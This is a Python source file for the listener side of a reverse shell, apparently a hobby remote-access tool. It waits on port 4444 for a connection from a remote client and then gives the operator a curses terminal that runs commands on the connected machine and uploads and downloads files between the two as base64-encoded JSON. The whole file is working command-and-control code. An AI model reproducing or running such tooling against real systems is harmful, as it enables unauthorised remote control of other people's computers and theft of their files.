#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import socket
import json
import base64
import curses
# import numpy as np
import time
# import subprocess
# import keyboard

class Listr:

    comm = ""
    lt_comm_ = []
    idx = 0

    cli_pad_y = 5000 # Column size

    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing
    

    def main_curses(self):
        curses.wrapper(self.run)


    def send_data(self, data):
#        print("\ntype: " + str(type(data)) + " - data: " + str(data) + "\n") #testing
        json_data = json.dumps(data)
#        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.sendall(json_data.encode())


    def rcve_data(self):
        json_data = ""
        while True:
            try:
#                print("exit 0") #testing
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
#                   print("break: " + str(json_data)) #testing
                    break
#               print("exit 1" + " - json_data: " + str(json_data)) #testing
                return json.loads(json_data)
            except ValueError:               
                continue


    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()


    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nDownloaded"
    

    def r_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()


    def run(self, cole):
        #curses.nocbreak()
        row = 1
        scrl_row = 0
        buff_ch = ""
        buff_com = ['']
        hist = ''
        (coley, colex) = cole.getmaxyx()
        cli_p = curses.newpad(self.cli_pad_y, colex - 3)
        cli_p.scrollok(True)
        cli_p.idlok(True)
        cli_p.keypad(True)
        cli_p.border()
        try:
            while True:
                # Checking if the size of the windows changed
                (coley_c, colex_c) = cole.getmaxyx()
                if coley_c != coley or colex_c != colex:
                    (coley, colex) = (coley_c, colex_c)
                    cli_p.addstr(0,0,"testing... rezising")
                    cli_p.resize(self.cli_pad_y, colex - 3)
                    cole.clear()
                    cole.refresh()
                
                cli_p.clear()

                # cli_p.addstr(0,0,"testing... scrl_row: " + str(scrl_row) + \
                #     "cursor: " + str(cli_p.getyx()))

                cli_p.addstr(1, 1, hist)
                cli_p.addstr(row, 1, str(self.addrs) + "$ " + buff_ch)
                
                cli_p.refresh(scrl_row, 0, 0, 0, coley - 1, colex - 3)

                #Capturing the input
                # The main 'enter' key retrieve 10, whereas the another 'enter' key 343 which
                # is the value that's working. (??)
                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 else input)(cli_p.getch())

                # Handling the scroll
                if inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN:
                    self.app_k__(cli_p, scrl_row, inp_ch, coley, colex)
                    print("out")

                # Handlig history and executing
                elif inp_ch == curses.KEY_ENTER:
                    # Managing the output history
                    buff_com[:0] = [buff_ch] # buff_com is the history commands, which will be scrolled.
                    hist += str(self.addrs) + "$ " + buff_ch + "\n"
                    hist += self.s_comm__(buff_ch) + "\n"
                    if cli_p.getyx()[0] + 1 < cli_p.getmaxyx()[0]:
                        row = cli_p.getyx()[0] + 1

                    buff_ch = ''

                    if row + 1 > coley - 1 and row < cli_p.getmaxyx()[0] - 1: 
                        scrl_row += 1

                elif inp_ch == curses.KEY_BACKSPACE:
                    buff_ch = buff_ch[:-1]
                elif inp_ch < 127 and inp_ch > 31:
                    buff_ch = buff_ch + chr(inp_ch)
        except curses.error as cur_err:
            print(cur_err)

    
    def s_comm__(self, comm):
        try:
            self.comm = comm.split(" ")
            # Here, the file is appended to the file.
            if self.comm[0] == "upload":
                self.comm.append(self.r_f(self.comm[1]))
            result = self.exe_rmy(self.comm)
            # while is to make sure if there is still connection
            while result == None:
                result = self.exe_rmy(self.comm)
            if self.comm[0] == "download" and "[Bad command]" not in result:
                result = self.w_f(self.comm[1], result.encode())
            print(f"\n{result}\n")
            if "exit" in comm:
                self.send_data("test...")
            return result
        except FileNotFoundError as notfound:
            print(f"\n{notfound.strerror}\n")
        except (BrokenPipeError, ConnectionError) as cnerr:
            print(cnerr.strerror + " - Connection down")
            self.conn.close()
            exit()
        except Exception as excep:
            print("Something went wrong. >>> " + str(excep))


    # scrolling
    def app_k__(self, cli_p, row, input_, y, x):
        max_row = row
        while True:
            if input_ == curses.KEY_UP:
                if row > 0:
                    row -= 1
                cli_p.refresh(row, 0, 0, 0, y - 1, x - 3)
            elif input_ == curses.KEY_DOWN:
                if row < max_row:
                    row += 1
                cli_p.refresh(row, 0, 0, 0, y - 1, x - 3)
            input_ = cli_p.getch()
            if input_ != curses.KEY_UP and input_ != curses.KEY_DOWN:
                break
    

    def rwl_ku__(self):
        if self.idx < len(self.lt_comm_):
            print(*self.lt_comm_[self.idx]), print("\b\b\b\b"),
            #keyboard.write("\b\b\b\b\b\b\b\b" + ' '.join(self.lt_comm_[self.idx]), delay=0.0)
            #print(' '.join(self.lt_comm_[self.idx]) + " up-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
            self.idx = self.idx + 1
    

    def rwl_kd__(self):
        if self.idx > 0:
            self.idx = self.idx - 1
            print(' '.join(self.lt_comm_[self.idx]), end=" ")
            # keyboard.write("\b" + ' '.join(self.lt_comm_[self.idx]))
            #print(self.lt_comm_[self.idx] + " down-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
        elif self.idx == 0:
            #keyboard.write("\b\b")
            print('\r', end=" ")
            

my_listner = Listr('', 4444)
my_listner.main_curses()